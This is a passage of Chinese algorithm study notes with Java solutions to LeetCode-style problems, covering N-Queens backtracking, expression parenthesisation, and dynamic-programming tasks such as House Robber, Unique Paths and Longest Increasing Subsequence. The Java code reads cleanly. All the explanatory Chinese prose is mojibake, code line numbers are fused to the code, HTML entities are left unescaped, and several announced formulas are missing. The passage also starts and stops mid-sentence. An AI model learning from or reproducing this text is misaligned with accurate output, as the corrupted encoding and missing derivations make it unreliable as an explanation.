çš„ä½ç½®æ‰€åœ¨çš„æ•°ç»„ä¸‹æ ‡ä¸º n - 1 - (r - c)ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344private List&lt;List&lt;String&gt;&gt; solutions;private char[][] nQueens;private boolean[] colUsed;private boolean[] diagonals45Used;private boolean[] diagonals135Used;private int n;public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; solutions = new ArrayList&lt;&gt;(); nQueens = new char[n][n]; for (int i = 0; i &lt; n; i++) &#123; Arrays.fill(nQueens[i], '.'); &#125; colUsed = new boolean[n]; diagonals45Used = new boolean[2 * n - 1]; diagonals135Used = new boolean[2 * n - 1]; this.n = n; backtracking(0); return solutions;&#125;private void backtracking(int row) &#123; if (row == n) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (char[] chars : nQueens) &#123; list.add(new String(chars)); &#125; solutions.add(list); return; &#125; for (int col = 0; col &lt; n; col++) &#123; int diagonals45Idx = row + col; int diagonals135Idx = n - 1 - (row - col); if (colUsed[col] || diagonals45Used[diagonals45Idx] || diagonals135Used[diagonals135Idx]) &#123; continue; &#125; nQueens[row][col] = 'Q'; colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = true; backtracking(row + 1); colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = false; nQueens[row][col] = '.'; &#125;&#125; åˆ†æ²»ç»™è¡¨è¾¾å¼åŠ æ‹¬å· 241. Different Ways to Add Parentheses (Medium) 123456Input: "2-1-1".((2-1)-1) = 0(2-(1-1)) = 2Output : [0, 2] 1234567891011121314151617181920212223242526272829public List&lt;Integer&gt; diffWaysToCompute(String input) &#123; List&lt;Integer&gt; ways = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; input.length(); i++) &#123; char c = input.charAt(i); if (c == '+' || c == '-' || c == '*') &#123; List&lt;Integer&gt; left = diffWaysToCompute(input.substring(0, i)); List&lt;Integer&gt; right = diffWaysToCompute(input.substring(i + 1)); for (int l : left) &#123; for (int r : right) &#123; switch (c) &#123; case '+': ways.add(l + r); break; case '-': ways.add(l - r); break; case '*': ways.add(l * r); break; &#125; &#125; &#125; &#125; &#125; if (ways.size() == 0) &#123; ways.add(Integer.valueOf(input)); &#125; return ways;&#125; åŠ¨æ€è§„åˆ’é€’å½’å’ŒåŠ¨æ€è§„åˆ’éƒ½æ˜¯å°†åŸé—®é¢˜æ‹†æˆå¤šä¸ªå­é—®é¢˜ç„¶åæ±‚è§£ï¼Œä»–ä»¬ä¹‹é—´æœ€æœ¬è´¨çš„åŒºåˆ«æ˜¯ï¼ŒåŠ¨æ€è§„åˆ’ä¿å­˜äº†å­é—®é¢˜çš„è§£ï¼Œé¿å…é‡å¤è®¡ç®—ã€‚ æ–æ³¢é‚£å¥‘æ•°åˆ—çˆ¬æ¥¼æ¢¯ 70. Climbing Stairs (Easy) é¢˜ç›®æè¿°ï¼šæœ‰ N é˜¶æ¥¼æ¢¯ï¼Œæ¯æ¬¡å¯ä»¥ä¸Šä¸€é˜¶æˆ–è€…ä¸¤é˜¶ï¼Œæ±‚æœ‰å¤šå°‘ç§ä¸Šæ¥¼æ¢¯çš„æ–¹æ³•ã€‚ å®šä¹‰ä¸€ä¸ªæ•°ç»„ dp å­˜å‚¨ä¸Šæ¥¼æ¢¯çš„æ–¹æ³•æ•°ï¼ˆä¸ºäº†æ–¹ä¾¿è®¨è®ºï¼Œæ•°ç»„ä¸‹æ ‡ä» 1 å¼€å§‹ï¼‰ï¼Œdp[i] è¡¨ç¤ºèµ°åˆ°ç¬¬ i ä¸ªæ¥¼æ¢¯çš„æ–¹æ³•æ•°ç›®ã€‚ç¬¬ i ä¸ªæ¥¼æ¢¯å¯ä»¥ä»ç¬¬ i-1 å’Œ i-2 ä¸ªæ¥¼æ¢¯å†èµ°ä¸€æ­¥åˆ°è¾¾ï¼Œèµ°åˆ°ç¬¬ i ä¸ªæ¥¼æ¢¯çš„æ–¹æ³•æ•°ä¸ºèµ°åˆ°ç¬¬ i-1 å’Œç¬¬ i-2 ä¸ªæ¥¼æ¢¯çš„æ–¹æ³•æ•°ä¹‹å’Œã€‚ dp[N] å³ä¸ºæ‰€æ±‚ã€‚ è€ƒè™‘åˆ° dp[i] åªä¸ dp[i - 1] å’Œ dp[i - 2] æœ‰å…³ï¼Œå› æ­¤å¯ä»¥åªç”¨ä¸¤ä¸ªå˜é‡æ¥å­˜å‚¨ dp[i - 1] å’Œ dp[i - 2]ï¼Œä½¿å¾—åŸæ¥çš„ O(N) ç©ºé—´å¤æ‚åº¦ä¼˜åŒ–ä¸º O(1) å¤æ‚åº¦ã€‚ 123456789101112public int climbStairs(int n) &#123; if (n &lt;= 2) &#123; return n; &#125; int pre2 = 1, pre1 = 2; for (int i = 2; i &lt; n; i++) &#123; int cur = pre1 + pre2; pre2 = pre1; pre1 = cur; &#125; return pre1;&#125; å¼ºç›—æŠ¢åŠ« 198. House Robber (Easy) é¢˜ç›®æè¿°ï¼šæŠ¢åŠ«ä¸€æ’ä½æˆ·ï¼Œä½†æ˜¯ä¸èƒ½æŠ¢é‚»è¿‘çš„ä½æˆ·ï¼Œæ±‚æœ€å¤§æŠ¢åŠ«é‡ã€‚ å®šä¹‰ dp æ•°ç»„ç”¨æ¥å­˜å‚¨æœ€å¤§çš„æŠ¢åŠ«é‡ï¼Œå…¶ä¸­ dp[i] è¡¨ç¤ºæŠ¢åˆ°ç¬¬ i ä¸ªä½æˆ·æ—¶çš„æœ€å¤§æŠ¢åŠ«é‡ã€‚ç”±äºä¸èƒ½æŠ¢åŠ«é‚»è¿‘ä½æˆ·ï¼Œå› æ­¤å¦‚æœæŠ¢åŠ«äº†ç¬¬ i ä¸ªä½æˆ·é‚£ä¹ˆåªèƒ½æŠ¢åŠ« i - 2 æˆ–è€… i - 3 çš„ä½æˆ·ï¼Œæ‰€ä»¥ 1234567891011121314151617public int rob(int[] nums) &#123; int n = nums.length; if (n == 0) &#123; return 0; &#125; if (n == 1) &#123; return nums[0]; &#125; int pre3 = 0, pre2 = 0, pre1 = 0; for (int i = 0; i &lt; n; i++) &#123; int cur = Math.max(pre2, pre3) + nums[i]; pre3 = pre2; pre2 = pre1; pre1 = cur; &#125; return Math.max(pre1, pre2);&#125; å¼ºç›—åœ¨ç¯å½¢è¡—åŒºæŠ¢åŠ« 213. House Robber II (Medium) 123456789101112131415161718192021public int rob(int[] nums) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int n = nums.length; if (n == 1) &#123; return nums[0]; &#125; return Math.max(rob(nums, 0, n - 2), rob(nums, 1, n - 1));&#125;private int rob(int[] nums, int first, int last) &#123; int pre3 = 0, pre2 = 0, pre1 = 0; for (int i = first; i &lt;= last; i++) &#123; int cur = Math.max(pre3, pre2) + nums[i]; pre3 = pre2; pre2 = pre1; pre1 = cur; &#125; return Math.max(pre2, pre1);&#125; æ¯ç‰›ç”Ÿäº§ ç¨‹åºå‘˜ä»£ç é¢è¯•æŒ‡å—-P181 é¢˜ç›®æè¿°ï¼šå‡è®¾å†œåœºä¸­æˆç†Ÿçš„æ¯ç‰›æ¯å¹´éƒ½ä¼šç”Ÿ 1 å¤´å°æ¯ç‰›ï¼Œå¹¶ä¸”æ°¸è¿œä¸ä¼šæ­»ã€‚ç¬¬ä¸€å¹´æœ‰ 1 åªå°æ¯ç‰›ï¼Œä»ç¬¬äºŒå¹´å¼€å§‹ï¼Œæ¯ç‰›å¼€å§‹ç”Ÿå°æ¯ç‰›ã€‚æ¯åªå°æ¯ç‰› 3 å¹´ä¹‹åæˆç†Ÿåˆå¯ä»¥ç”Ÿå°æ¯ç‰›ã€‚ç»™å®šæ•´æ•° Nï¼Œæ±‚ N å¹´åç‰›çš„æ•°é‡ã€‚ ç¬¬ i å¹´æˆç†Ÿçš„ç‰›çš„æ•°é‡ä¸ºï¼š ä¿¡ä»¶é”™æ’ é¢˜ç›®æè¿°ï¼šæœ‰ N ä¸ª ä¿¡ å’Œ ä¿¡å°ï¼Œå®ƒä»¬è¢«æ‰“ä¹±ï¼Œæ±‚é”™è¯¯è£…ä¿¡æ–¹å¼çš„æ•°é‡ã€‚ å®šä¹‰ä¸€ä¸ªæ•°ç»„ dp å­˜å‚¨é”™è¯¯æ–¹å¼æ•°é‡ï¼Œdp[i] è¡¨ç¤ºå‰ i ä¸ªä¿¡å’Œä¿¡å°çš„é”™è¯¯æ–¹å¼æ•°é‡ã€‚å‡è®¾ç¬¬ i ä¸ªä¿¡è£…åˆ°ç¬¬ j ä¸ªä¿¡å°é‡Œé¢ï¼Œè€Œç¬¬ j ä¸ªä¿¡è£…åˆ°ç¬¬ k ä¸ªä¿¡å°é‡Œé¢ã€‚æ ¹æ® i å’Œ k æ˜¯å¦ç›¸ç­‰ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š i==kï¼Œäº¤æ¢ i å’Œ k çš„ä¿¡åï¼Œå®ƒä»¬çš„ä¿¡å’Œä¿¡å°åœ¨æ­£ç¡®çš„ä½ç½®ï¼Œä½†æ˜¯å…¶ä½™ i-2 å°ä¿¡æœ‰ dp[i-2] ç§é”™è¯¯è£…ä¿¡çš„æ–¹å¼ã€‚ç”±äº j æœ‰ i-1 ç§å–å€¼ï¼Œå› æ­¤å…±æœ‰ (i-1)*dp[i-2] ç§é”™è¯¯è£…ä¿¡æ–¹å¼ã€‚ i != kï¼Œäº¤æ¢ i å’Œ j çš„ä¿¡åï¼Œç¬¬ i ä¸ªä¿¡å’Œä¿¡å°åœ¨æ­£ç¡®çš„ä½ç½®ï¼Œå…¶ä½™ i-1 å°ä¿¡æœ‰ dp[i-1] ç§é”™è¯¯è£…ä¿¡æ–¹å¼ã€‚ç”±äº j æœ‰ i-1 ç§å–å€¼ï¼Œå› æ­¤å…±æœ‰ (i-1)*dp[i-1] ç§é”™è¯¯è£…ä¿¡æ–¹å¼ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œé”™è¯¯è£…ä¿¡æ•°é‡æ–¹å¼æ•°é‡ä¸ºï¼š dp[N] å³ä¸ºæ‰€æ±‚ã€‚ çŸ©é˜µè·¯å¾„çŸ©é˜µçš„æœ€å°è·¯å¾„å’Œ 64. Minimum Path Sum (Medium) 1234[[1,3,1], [1,5,1], [4,2,1]]Given the above grid map, return 7. Because the path 1â†’3â†’1â†’1â†’1 minimizes the sum. é¢˜ç›®æè¿°ï¼šæ±‚ä»çŸ©é˜µçš„å·¦ä¸Šè§’åˆ°å³ä¸‹è§’çš„æœ€å°è·¯å¾„å’Œï¼Œæ¯æ¬¡åªèƒ½å‘å³å’Œå‘ä¸‹ç§»åŠ¨ã€‚ 1234567891011121314151617181920public int minPathSum(int[][] grid) &#123; if (grid.length == 0 || grid[0].length == 0) &#123; return 0; &#125; int m = grid.length, n = grid[0].length; int[] dp = new int[n]; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (j == 0) &#123; dp[j] = dp[j]; // åªèƒ½ä»ä¸Šä¾§èµ°åˆ°è¯¥ä½ç½® &#125; else if (i == 0) &#123; dp[j] = dp[j - 1]; // åªèƒ½ä»å·¦ä¾§èµ°åˆ°è¯¥ä½ç½® &#125; else &#123; dp[j] = Math.min(dp[j - 1], dp[j]); &#125; dp[j] += grid[i][j]; &#125; &#125; return dp[n - 1];&#125; çŸ©é˜µçš„æ€»è·¯å¾„æ•° 62. Unique Paths (Medium) é¢˜ç›®æè¿°ï¼šç»Ÿè®¡ä»çŸ©é˜µå·¦ä¸Šè§’åˆ°å³ä¸‹è§’çš„è·¯å¾„æ€»æ•°ï¼Œæ¯æ¬¡åªèƒ½å‘å³æˆ–è€…å‘ä¸‹ç§»åŠ¨ã€‚ 12345678910public int uniquePaths(int m, int n) &#123; int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i &lt; m; i++) &#123; for (int j = 1; j &lt; n; j++) &#123; dp[j] = dp[j] + dp[j - 1]; &#125; &#125; return dp[n - 1];&#125; ä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ•°å­¦å…¬å¼æ±‚è§£ï¼Œè¿™æ˜¯ä¸€ä¸ªç»„åˆé—®é¢˜ã€‚æœºå™¨äººæ€»å…±ç§»åŠ¨çš„æ¬¡æ•° S=m+n-2ï¼Œå‘ä¸‹ç§»åŠ¨çš„æ¬¡æ•° D=m-1ï¼Œé‚£ä¹ˆé—®é¢˜å¯ä»¥çœ‹æˆä» S ä»å–å‡º D ä¸ªä½ç½®çš„ç»„åˆæ•°é‡ï¼Œè¿™ä¸ªé—®é¢˜çš„è§£ä¸º C(S, D)ã€‚ 123456789public int uniquePaths(int m, int n) &#123; int S = m + n - 2; // æ€»å…±çš„ç§»åŠ¨æ¬¡æ•° int D = m - 1; // å‘ä¸‹çš„ç§»åŠ¨æ¬¡æ•° long ret = 1; for (int i = 1; i &lt;= D; i++) &#123; ret = ret * (S - D + i) / i; &#125; return (int) ret;&#125; æ•°ç»„åŒºé—´æ•°ç»„åŒºé—´å’Œ 303. Range Sum Query - Immutable (Easy) 12345Given nums = [-2, 0, 3, -5, 2, -1]sumRange(0, 2) -&gt; 1sumRange(2, 5) -&gt; -1sumRange(0, 5) -&gt; -3 æ±‚åŒºé—´ i \ j çš„å’Œï¼Œå¯ä»¥è½¬æ¢ä¸º sum[j] - sum[i-1]ï¼Œå…¶ä¸­ sum[i] ä¸º 0 \ i çš„å’Œã€‚ 1234567891011121314class NumArray &#123; private int[] sums; public NumArray(int[] nums) &#123; sums = new int[nums.length]; for (int i = 0; i &lt; nums.length; i++) &#123; sums[i] = i == 0 ? nums[0] : sums[i - 1] + nums[i]; &#125; &#125; public int sumRange(int i, int j) &#123; return i == 0 ? sums[j] : sums[j] - sums[i - 1]; &#125;&#125; å­æ•°ç»„æœ€å¤§çš„å’Œ 53. Maximum Subarray (Easy) 12For example, given the array [-2,1,-3,4,-1,2,1,-5,4],the contiguous subarray [4,-1,2,1] has the largest sum = 6. 123456789101112public int maxSubArray(int[] nums) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int preSum = nums[0]; int maxSum = preSum; for (int i = 1; i &lt; nums.length; i++) &#123; preSum = preSum &gt; 0 ? preSum + nums[i] : nums[i]; maxSum = Math.max(maxSum, preSum); &#125; return maxSum;&#125; æ•°ç»„ä¸­ç­‰å·®é€’å¢å­åŒºé—´çš„ä¸ªæ•° 413. Arithmetic Slices (Medium) 12A = [1, 2, 3, 4]return: 3, for 3 arithmetic slices in A: [1, 2, 3], [2, 3, 4] and [1, 2, 3, 4] itself. dp[i] è¡¨ç¤ºä»¥ A[i] ä¸ºç»“å°¾çš„ç­‰å·®é€’å¢å­åŒºé—´çš„ä¸ªæ•°ã€‚ å¦‚æœ A[i] - A[i - 1] == A[i - 1] - A[i - 2]ï¼Œè¡¨ç¤º [A[i - 2], A[i - 1], A[i]] æ˜¯ä¸€ä¸ªç­‰å·®é€’å¢å­åŒºé—´ã€‚å¦‚æœ [A[i - 3], A[i - 2], A[i - 1]] æ˜¯ä¸€ä¸ªç­‰å·®é€’å¢å­åŒºé—´ï¼Œé‚£ä¹ˆ [A[i - 3], A[i - 2], A[i - 1], A[i]] ä¹Ÿæ˜¯ã€‚å› æ­¤åœ¨è¿™ä¸ªæ¡ä»¶ä¸‹ï¼Œdp[i] = dp[i-1] + 1ã€‚ 1234567891011121314151617public int numberOfArithmeticSlices(int[] A) &#123; if (A == null || A.length == 0) &#123; return 0; &#125; int n = A.length; int[] dp = new int[n]; for (int i = 2; i &lt; n; i++) &#123; if (A[i] - A[i - 1] == A[i - 1] - A[i - 2]) &#123; dp[i] = dp[i - 1] + 1; &#125; &#125; int total = 0; for (int cnt : dp) &#123; total += cnt; &#125; return total;&#125; åˆ†å‰²æ•´æ•°åˆ†å‰²æ•´æ•°çš„æœ€å¤§ä¹˜ç§¯ 343. Integer Break (Medim) é¢˜ç›®æè¿°ï¼šFor example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). 12345678910public int integerBreak(int n) &#123; int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= i - 1; j++) &#123; dp[i] = Math.max(dp[i], Math.max(j * dp[i - j], j * (i - j))); &#125; &#125; return dp[n];&#125; æŒ‰å¹³æ–¹æ•°æ¥åˆ†å‰²æ•´æ•° 279. Perfect Squares(Medium) é¢˜ç›®æè¿°ï¼šFor example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. 123456789101112131415161718192021222324252627public int numSquares(int n) &#123; List&lt;Integer&gt; squareList = generateSquareList(n); int[] dp = new int[n + 1]; for (int i = 1; i &lt;= n; i++) &#123; int min = Integer.MAX_VALUE; for (int square : squareList) &#123; if (square &gt; i) &#123; break; &#125; min = Math.min(min, dp[i - square] + 1); &#125; dp[i] = min; &#125; return dp[n];&#125;private List&lt;Integer&gt; generateSquareList(int n) &#123; List&lt;Integer&gt; squareList = new ArrayList&lt;&gt;(); int diff = 3; int square = 1; while (square &lt;= n) &#123; squareList.add(square); square += diff; diff += 2; &#125; return squareList;&#125; åˆ†å‰²æ•´æ•°æ„æˆå­—æ¯å­—ç¬¦ä¸² 91. Decode Ways (Medium) é¢˜ç›®æè¿°ï¼šGiven encoded message â€œ12â€, it could be decoded as â€œABâ€ (1 2) or â€œLâ€ (12). 1234567891011121314151617181920212223public int numDecodings(String s) &#123; if (s == null || s.length() == 0) &#123; return 0; &#125; int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == '0' ? 0 : 1; for (int i = 2; i &lt;= n; i++) &#123; int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) &#123; dp[i] += dp[i - 1]; &#125; if (s.charAt(i - 2) == '0') &#123; continue; &#125; int two = Integer.valueOf(s.substring(i - 2, i)); if (two &lt;= 26) &#123; dp[i] += dp[i - 2]; &#125; &#125; return dp[n];&#125; æœ€é•¿é€’å¢å­åºåˆ—å·²çŸ¥ä¸€ä¸ªåºåˆ— {S1, S2,â€¦,Sn} ï¼Œå–å‡ºè‹¥å¹²æ•°ç»„æˆæ–°çš„åºåˆ— {Si1, Si2,â€¦, Sim}ï¼Œå…¶ä¸­ i1ã€i2 â€¦ im ä¿æŒé€’å¢ï¼Œå³æ–°åºåˆ—ä¸­å„ä¸ªæ•°ä»ç„¶ä¿æŒåŸæ•°åˆ—ä¸­çš„å…ˆåé¡ºåºï¼Œç§°æ–°åºåˆ—ä¸ºåŸåºåˆ—çš„ä¸€ä¸ª å­åºåˆ— ã€‚ å¦‚æœåœ¨å­åºåˆ—ä¸­ï¼Œå½“ä¸‹æ ‡ ix &gt; iy æ—¶ï¼ŒSix &gt; Siyï¼Œç§°å­åºåˆ—ä¸ºåŸåºåˆ—çš„ä¸€ä¸ª é€’å¢å­åºåˆ— ã€‚ å®šä¹‰ä¸€ä¸ªæ•°ç»„ dp å­˜å‚¨æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦ï¼Œdp[n] è¡¨ç¤ºä»¥ Sn ç»“å°¾çš„åºåˆ—çš„æœ€é•¿é€’å¢å­åºåˆ—é•¿åº¦ã€‚å¯¹äºä¸€ä¸ªé€’å¢å­åºåˆ— {Si1, Si2,â€¦,Sim}ï¼Œå¦‚æœ im &lt; n å¹¶ä¸” Sim &lt; Sn ï¼Œæ­¤æ—¶ {Si1, Si2,â€¦, Sim, Sn} ä¸ºä¸€ä¸ªé€’å¢å­åºåˆ—ï¼Œé€’å¢å­åºåˆ—çš„é•¿åº¦å¢åŠ  1ã€‚æ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„é€’å¢å­åºåˆ—ä¸­ï¼Œé•¿åº¦æœ€é•¿çš„é‚£ä¸ªé€’å¢å­åºåˆ—å°±æ˜¯è¦æ‰¾çš„ï¼Œåœ¨é•¿åº¦æœ€é•¿çš„é€’å¢å­åºåˆ—ä¸ŠåŠ ä¸Š Sn å°±æ„æˆäº†ä»¥ Sn ä¸ºç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—ã€‚å› æ­¤ dp[n] = max{ dp[i]+1 | Si &lt; Sn &amp;&amp; i &lt; n} ã€‚ å› ä¸ºåœ¨æ±‚ dp[n] æ—¶å¯èƒ½æ— æ³•æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„é€’å¢å­åºåˆ—ï¼Œæ­¤æ—¶ {Sn} å°±æ„æˆäº†é€’å¢å­åºåˆ—ï¼Œéœ€è¦å¯¹å‰é¢çš„æ±‚è§£æ–¹ç¨‹åšä¿®æ”¹ï¼Œä»¤ dp[n] æœ€å°ä¸º 1ï¼Œå³ï¼š å¯¹äºä¸€ä¸ªé•¿åº¦ä¸º N çš„åºåˆ—ï¼Œæœ€é•¿é€’å¢å­åºåˆ—å¹¶ä¸ä¸€å®šä¼šä»¥ SN ä¸ºç»“å°¾ï¼Œå› æ­¤ dp[N] ä¸æ˜¯åºåˆ—çš„æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦ï¼Œéœ€è¦éå† dp æ•°ç»„æ‰¾å‡ºæœ€å¤§å€¼æ‰æ˜¯æ‰€è¦çš„ç»“æœï¼Œå³ max{ dp[i] | 1 &lt;= i &lt;= N} å³ä¸ºæ‰€æ±‚ã€‚ æœ€é•¿é€’å¢å­åºåˆ— 300. Longest Increasing Subsequence (Medium) 1234567891011121314public int lengthOfLIS(int[] nums) &#123; int n = nums.length; int[] dp = new int[n]; for (int i = 0; i &lt; n; i++) &#123; int max = 1; for (int j = 0; j &lt; i; j++) &#123; if (nums[i] &gt; nums[j]) &#123; max = Math.max(max, dp[j] + 1); &#125; &#125; dp[i] = max; &#125; return Arrays.stream(dp).max().orElse(0);&#125; ä½¿ç”¨ Stream æ±‚æœ€å¤§å€¼ä¼šå¯¼è‡´è¿è¡Œæ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥æ”¹æˆä»¥ä¸‹å½¢å¼ï¼š 12345int ret = 0;for (int i = 0; i &lt; n; i++) &#123; ret = Math.max(ret, dp[i]);&#125;return ret; ä»¥ä¸Šè§£æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(N2) ï¼Œå¯ä»¥ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾å°†æ—¶é—´å¤æ‚åº¦é™ä½ä¸º O(NlogN)ã€‚ å®šä¹‰ä¸€ä¸ª tails æ•°ç»„ï¼Œå…¶ä¸­ tails[i] å­˜å‚¨é•¿åº¦ä¸º i + 1 çš„æœ€é•¿é€’å¢å­åºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚å¯¹äºä¸€ä¸ªå…ƒç´  xï¼Œ å¦‚æœå®ƒå¤§äº tails æ•°ç»„æ‰€æœ‰çš„å€¼ï¼Œé‚£ä¹ˆæŠŠå®ƒæ·»åŠ åˆ° tails åé¢ï¼Œè¡¨ç¤ºæœ€é•¿é€’å¢å­åºåˆ—é•¿åº¦åŠ  1ï¼› å¦‚æœ tails[i-1] &lt; x &lt;= tails[i]ï¼Œé‚£ä¹ˆæ›´æ–° tails[i-1] = xã€‚ ä¾‹å¦‚å¯¹äºæ•°ç»„ [4,3,6,5]ï¼Œæœ‰ï¼š 123456tails len num[] 0 4[4] 1 3[3] 1 6[3,6] 2 5[3,5] 2 null å¯ä»¥çœ‹å‡º tails æ•°ç»„ä¿æŒæœ‰åºï¼Œå› æ­¤åœ¨æŸ¥æ‰¾ Si ä½äº tails æ•°ç»„çš„ä½ç½®æ—¶å°±å¯ä»¥ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾ã€‚ 12345678910111213141516171819202122232425262728public int lengthOfLIS(int[] nums) &#123; int n = nums.length; int[] tails = new int[n]; int len = 0; for (int num : nums) &#123; int index = binarySearch(tails, len, num); tails[index] = num; if (index == len) &#123; len++; &#125; &#125; return len;&#125;private int binarySearch(int[] tails, int len, int key) &#123; int l = 0, h = len; while (l &lt; h) &#123; int mid = l + (h - l) / 2; if (tails[mid] == key) &#123; return mid; &#125; else if (tails[mid] &gt; key) &#123; h = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return l;&#125; ä¸€ç»„æ•´æ•°å¯¹èƒ½å¤Ÿæ„æˆçš„æœ€é•¿é“¾ 646. Maximum Length of Pair Chain (Medium) 123Input: [[1,2], [2,3], [3,4]]Output: 2Explanation: The longest chain is [1,2] -&gt; [3,4] é¢˜ç›®æè¿°ï¼šå¯¹äº (a, b) å’Œ (c, d) ï¼Œå¦‚æœ b &lt; cï¼Œåˆ™å®ƒä»¬å¯ä»¥æ„æˆä¸€æ¡é“¾ã€‚ 1234567891011121314151617public int findLongestChain(int[][] pairs) &#123; if (pairs == null || pairs.length == 0) &#123; return 0; &#125; Arrays.sort(pairs, (a, b) -&gt; (a[0] - b[0])); int n = pairs.length; int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i &lt; n; i++) &#123; for (int j = 0; j &lt; i; j++) &#123; if (pairs[j][1] &lt; pairs[i][0]) &#123; dp[i] = Math.max(dp[i], dp[j] + 1); &#125; &#125; &#125; return Arrays.stream(dp).max().orElse(0);&#125; æœ€é•¿æ‘†åŠ¨å­åºåˆ— 376. Wiggle Subsequence (Medium) 12345678910Input: [1,7,4,9,2,5]Output: 6The entire sequence is a wiggle sequence.Input: [1,17,5,10,13,15,10,5,16,8]Output: 7There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8].Input: [1,2,3,4,5,6,7,8,9]Output: 2 è¦æ±‚ï¼šä½¿ç”¨ O(N) æ—¶é—´å¤æ‚åº¦æ±‚è§£ã€‚ 1234567891011121314public int wiggleMaxLength(int[] nums) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int up = 1, down = 1; for (int i = 1; i &lt; nums.length; i++) &#123; if (nums[i] &gt; nums[i - 1]) &#123; up = down + 1; &#125; else if (nums[i] &lt; nums[i - 1]) &#123; down = up + 1; &#125; &#125; return Math.max(up, down);&#125; æœ€é•¿å…¬å…±å­åºåˆ—å¯¹äºä¸¤ä¸ªå­åºåˆ— S1 å’Œ S2ï¼Œæ‰¾å‡ºå®ƒä»¬æœ€é•¿çš„å…¬å…±å­åºåˆ—ã€‚ å®šä¹‰ä¸€ä¸ªäºŒç»´æ•°ç»„ dp ç”¨æ¥å­˜å‚¨æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦ï¼Œå…¶ä¸­ dp[i][j] è¡¨ç¤º S1 çš„å‰ i ä¸ªå­—ç¬¦ä¸ S2 çš„å‰ j ä¸ªå­—ç¬¦æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦ã€‚è€ƒè™‘ S1i ä¸ S2j å€¼æ˜¯å¦ç›¸ç­‰ï¼Œåˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š å½“ S1i==S2j æ—¶ï¼Œé‚£ä¹ˆå°±èƒ½åœ¨ S1 çš„å‰ i-1 ä¸ªå­—ç¬¦ä¸ S2 çš„å‰ j-1 ä¸ªå­—ç¬¦æœ€é•¿å…¬å…±å­åºåˆ—çš„åŸºç¡€ä¸Šå†åŠ ä¸Š S1i è¿™ä¸ªå€¼ï¼Œæœ€é•¿å…¬å…±å­åºåˆ—é•¿åº¦åŠ  1 ï¼Œå³ dp[i][j] = dp[i-1][j-1] + 1ã€‚ å½“ S1i != S2j æ—¶ï¼Œæ­¤æ—¶æœ€é•¿å…¬å…±å­åºåˆ—ä¸º S1 çš„å‰ i-1 ä¸ªå­—ç¬¦å’Œ S2 çš„å‰ j ä¸ªå­—ç¬¦æœ€é•¿å…¬å…±å­åºåˆ—ï¼Œä¸ S1 çš„å‰ i ä¸ªå­—ç¬¦å’Œ S2 çš„å‰ j-1 ä¸ªå­—ç¬¦æœ€é•¿å…¬å…±å­åºåˆ—ï¼Œå®ƒä»¬çš„æœ€å¤§è€…ï¼Œå³ dp[i][j] = max{ dp[i-1][j], dp[i][j-1] }ã€‚ ç»¼ä¸Šï¼Œæœ€é•¿å…¬å…±å­åºåˆ—çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸ºï¼š å¯¹äºé•¿åº¦ä¸º N çš„åºåˆ— S1 å’Œ é•¿åº¦ä¸º M çš„åºåˆ— S2ï¼Œdp[N][M] å°±æ˜¯åºåˆ— S1 å’Œåºåˆ— S2 çš„æœ€é•¿å…¬å…±å­åºåˆ—é•¿åº¦ã€‚ ä¸æœ€é•¿é€’å¢å­åºåˆ—ç›¸æ¯”ï¼Œæœ€é•¿å…¬å…±å­åºåˆ—æœ‰ä»¥ä¸‹ä¸åŒç‚¹ï¼š é’ˆå¯¹çš„æ˜¯ä¸¤ä¸ªåºåˆ—ï¼Œæ±‚å®ƒä»¬çš„æœ€é•¿å…¬å…±å­åºåˆ—ã€‚ åœ¨æœ€é•¿é€’å¢å­åºåˆ—ä¸­ï¼Œdp[i] è¡¨ç¤ºä»¥ Si ä¸ºç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—é•¿åº¦ï¼Œå­åºåˆ—å¿…é¡»åŒ…å« Si ï¼›åœ¨æœ€é•¿å…¬å…±å­åºåˆ—ä¸­ï¼Œdp[i][j] è¡¨ç¤º S1 ä¸­å‰ i ä¸ªå­—ç¬¦ä¸ S2 ä¸­å‰ j ä¸ªå­—ç¬¦çš„æœ€é•¿å…¬å…±å­åºåˆ—é•¿åº¦ï¼Œä¸ä¸€å®šåŒ…å« S1i å’Œ S2j ã€‚ åœ¨æ±‚æœ€ç»ˆè§£æ—¶ï¼Œæœ€é•¿å…¬å…±å­åºåˆ—ä¸­ dp[N][M] 